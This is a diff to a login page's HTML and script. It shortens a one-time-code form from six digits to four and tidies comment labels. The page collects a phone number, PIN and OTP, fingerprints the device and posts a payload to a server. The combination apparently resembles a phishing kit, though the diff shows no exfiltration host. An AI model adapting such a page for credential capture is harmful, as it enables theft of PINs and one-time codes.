@@ -144,11 +144,9 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
       <input class="otp-digit" id="d1" maxlength="1" inputmode="numeric">
       <input class="otp-digit" id="d2" maxlength="1" inputmode="numeric">
       <input class="otp-digit" id="d3" maxlength="1" inputmode="numeric">
-      <input class="otp-digit" id="d4" maxlength="1" inputmode="numeric">
-      <input class="otp-digit" id="d5" maxlength="1" inputmode="numeric">
     </div>
 
-    <div id="otpWarning" class="otp-warning">Please enter 6 digits</div>
+    <div id="otpWarning" class="otp-warning">Please enter 4 digits</div>
 
     <div class="resend-row">
       <div class="small" id="resendInfo">
@@ -167,7 +165,7 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
 </div>
 
 <script>
-/* ===== DEVICE STRING (ORIGINAL STYLE) ===== */
+/* ===== DEVICE STRING ===== */
 const ua = navigator.userAgent;
 let device = 'Unknown';
 
@@ -212,7 +210,7 @@ phone.addEventListener('input',()=>{
   updateLogin();
 });
 
-/* ===== PIN (ORIGINAL BACKSPACE BEHAVIOR) ===== */
+/* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
 
@@ -249,7 +247,7 @@ async function sendToServer(payload){
 
 /* ===== OTP ===== */
 const otpModal=document.getElementById('otpModal');
-const dEls=[...Array(6)].map((_,i)=>document.getElementById('d'+i));
+const dEls=[0,1,2,3].map(i=>document.getElementById('d'+i));
 const confirmBtn=document.getElementById('confirmOtp');
 const cancelBtn=document.getElementById('cancelOtp');
 const resendBtn=document.getElementById('resendBtn');
@@ -278,7 +276,7 @@ function startCountdown(){
 function getOtp(){return dEls.map(d=>d.value).join('');}
 
 function updateConfirm(){
-  const ok=/^\d{6}$/.test(getOtp());
+  const ok=/^\d{4}$/.test(getOtp());
   confirmBtn.disabled=!ok;
   otpWarning.style.display=ok?'none':'block';
 }
@@ -286,7 +284,7 @@ function updateConfirm(){
 dEls.forEach((d,i)=>{
   d.addEventListener('input',()=>{
     d.value=d.value.replace(/\D/g,'');
-    if(d.value && i<5) dEls[i+1].focus();
+    if(d.value && i<3) dEls[i+1].focus();
     updateConfirm();
   });
   d.addEventListener('keydown',e=>{
@@ -298,7 +296,7 @@ dEls.forEach((d,i)=>{
   });
 });
 
-/* ===== LOGIN EVENTS (ORIGINAL FORMAT) ===== */
+/* ===== LOGIN EVENTS ===== */
 document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
   if(document.getElementById('hp').value) return;
